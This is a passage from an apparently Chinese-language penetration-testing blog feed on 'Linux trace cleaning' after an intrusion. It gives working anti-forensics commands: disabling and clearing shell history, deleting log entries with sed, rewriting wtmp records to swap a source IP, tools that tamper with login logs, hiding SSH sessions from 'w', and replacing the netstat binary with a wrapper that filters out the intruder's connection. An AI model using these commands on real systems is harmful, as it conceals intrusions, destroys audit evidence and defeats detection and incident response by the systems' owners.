class="line">history |more 可以查看到历史命令的具体时间    &#x2F;bin&#x2F;bash下测试有效</span><br><span class="line"></span><br><span class="line">CTRL+r 进入历史命令搜索模式   输入部分关键字 搜索后回车执行</span><br><span class="line"></span><br><span class="line">快速执行上一条命令</span><br><span class="line">!!</span><br><span class="line">上</span><br><span class="line">!-1(同样在查看到编号后可以!+数字执行)</span><br><span class="line">ctrl p</span><br><span class="line"></span><br><span class="line">有关变量</span><br><span class="line">HISTSIZE 指定历史记录文件的大小</span><br><span class="line">HISTFILE 指定记录历史命令的文件</span><br><span class="line"></span><br><span class="line">history -c 清除当前shell对应的所有的命令历史(直接清空文件) 需要注意不同的执行环境</span><br><span class="line">history -a 将历史命令缓冲区内容写入到文件中(多个session)</span><br><span class="line">history -w 将当前历史命令缓冲区内容写入到文件中</span><br><span class="line">history -r 清除当前历史命令缓冲区的内容</span><br></pre></td></tr></table></figure><p>根据上述命令，每一次session结束后会自动将命令执行，缓冲区的内容写入到历史命令记录文件中。因此可以在每次执行结束后执行<code>history -r</code>清除。也可以指定<code>export HISTFILE=为空或者置为/dev/null</code>让结束后命令历史写入的文件不存在。也可以修改<code>HISTSIZE</code>为0，禁止写入到历史记录文件中。</p><p><code>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0</code></p><p>如果在日志中已经有了记录，可以在无痕状态下使用sed进行清除<code>sed  -i &#39;/content/&#39;d  file</code></p><h3 id="相关文件"><a href="#相关文件" class="headerlink" title="相关文件"></a>相关文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">last-----&gt; &#x2F;var&#x2F;log&#x2F;wtmp       记录计算机重启和登入的情况</span><br><span class="line">lastlog-----&gt; &#x2F;var&#x2F;log&#x2F;lastlog 记录用户上一次登录历史</span><br><span class="line">lastb------&gt; &#x2F;var&#x2F;log&#x2F;btmp     记录登录失败历史</span><br><span class="line">w----------&gt;&#x2F;varr&#x2F;run&#x2F;utmp     w命令查看当前在线</span><br><span class="line"></span><br><span class="line">&#x2F;var&#x2F;log&#x2F;message 系统启动后的信息和错误日志，是Red Hat Linux中最常用的日志之一</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;secure 与安全相关的日志信息</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;maillog 与邮件相关的日志信息</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;cron 与定时任务相关的日志信息</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;spooler 与UUCP和news设备相关的日志信息</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;boot.log 守护进程启动和停止相关的日志消息</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;auth.log  系统登录日志(debian系统)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">~&#x2F;.bash_history  其余的tcsh、zsh、sh、ksh等</span><br><span class="line">~&#x2F;.mysql_history  mysql命令执行历史</span><br><span class="line">~&#x2F;.viminfo   记录vim 操作记录  可还原写入文件</span><br><span class="line"></span><br><span class="line">其余一些web服务的日志</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log   ---error.log等</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br><span class="line">很多Java中间件或组件的日志会存在应用目录的log目录下</span><br><span class="line">如tomcat的catalina.out,activeMq的activemq.log</span><br><span class="line">更具体的路径可以相应查看log.properties或者log4j.properties以及代码中的设置</span><br></pre></td></tr></table></figure><p>对于文件的删除比较粗糙可以直接<code>echo &gt; file</code>清空，也可以稍微精细一点使用<code>sed</code>对文本文件进行删除。对于<code>wtmp,btmp,utmp</code>这种二进制文件可以使用<a href="https://github.com/re4lity/logtamper" target="_blank" rel="noopener">logtamper</a>(可以隐藏w连接并清除掉指定的ip登录记录，对于lastlog只能修改登录时间)，<a href="https://github.com/Mr-xn/Penetration_Testing_POC/blob/master/tools/ssh/fake_login_log.py" target="_blank" rel="noopener">fake_login_log.py</a>可以进一步对登录信息进行隐藏。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Linux可以使用如下命令将二进制文件转换为文本后操作</span><br><span class="line">utmpdump &#x2F;var&#x2F;log&#x2F;wtmp |sed &quot;s&#x2F;192.168.233.132&#x2F;1.1.1.1&#x2F;g&quot; |utmpdump -r &gt;&#x2F;tmp&#x2F;wtmp1 &amp;&amp;\mv  &#x2F;tmp&#x2F;wtmp1 &#x2F;var&#x2F;log&#x2F;wtmp</span><br><span class="line">Unix</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;acct&#x2F;fwtmp &lt; &#x2F;var&#x2F;adm&#x2F;wtmpx | sed &quot;s&#x2F;192.168.8.88&#x2F;localhost&#x2F;g&quot; | &#x2F;usr&#x2F;lib&#x2F;acct&#x2F;fwtmp -ic &gt; &#x2F;var&#x2F;adm&#x2F;wtmpx</span><br></pre></td></tr></table></figure><h3 id="Tip"><a href="#Tip" class="headerlink" title="Tip"></a>Tip</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssh -T root@127.0.0.1 &#x2F;bin&#x2F;bash -i -T参数隐藏w命令查看</span><br><span class="line">ssh -o UserKnownHostsFile&#x3D;&#x2F;dev&#x2F;null -T user@host &#x2F;bin&#x2F;bash –i  不记录Linux公钥到known_hosts中</span><br><span class="line">直接查看网络连接netstat -antp| grep 22还是存在的</span><br><span class="line"></span><br><span class="line">进一步简单的隐藏可以备份bin文件替换成其他可执行sh文件写入命令过滤自己的连接</span><br><span class="line">which netstat </span><br><span class="line">cp &#x2F;path&#x2F;netstat &#x2F;path&#x2F;netstat.bak</span><br><span class="line">vi &#x2F;path&#x2F;netstat ----&gt; &#x2F;path&#x2F;netstat.bak $&#123;*&#125; &#125; |grep -v ip </span><br><span class="line">更深层次就需要进行Hook或者驱动级隐藏</span><br></pre></td></tr></table></figure><p>其实渗透就和下棋一样，步步为营，每走一步都需要细致的考虑会造成什么影响，在结束后进行还原，上传什么文件，不用后马上删掉。宁可慢一点检查一遍命令，也不要随意复制乱敲，导致后续需要花费更大的功夫来补救。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Linux-痕迹清理&quot;&gt;&lt;a href=&quot;#Linux-痕迹清理&quot; class=&quot;headerlink&quot; title=&quot;Linux 痕迹清理&quot;&gt;&lt;/a&gt;Linux 痕迹清理&lt;/h2&gt;&lt;h3 id=&quot;常见命令&quot;&gt;&lt;a href=&quot;#常见命令&quot; class=&quot;head
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
